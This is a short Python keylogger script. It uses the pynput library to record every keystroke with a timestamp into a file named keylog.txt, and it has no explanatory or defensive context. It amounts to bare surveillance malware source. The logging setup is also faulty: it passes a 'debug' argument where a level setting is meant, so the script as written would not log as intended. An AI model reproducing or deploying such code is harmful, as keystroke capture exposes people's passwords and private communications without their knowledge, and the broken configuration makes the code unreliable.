from pynput.keyboard import Key, Listener
import logging
 
logging.basicConfig(filename=("keylog.txt"), 
debug=logging.DEBUG, format=" %(asctime)s - %(message)s")


def premi_tasto(tasto):
    logging.info(str(tasto))
 

with Listener(on_press=premi_tasto) as listener:
    listener.join()
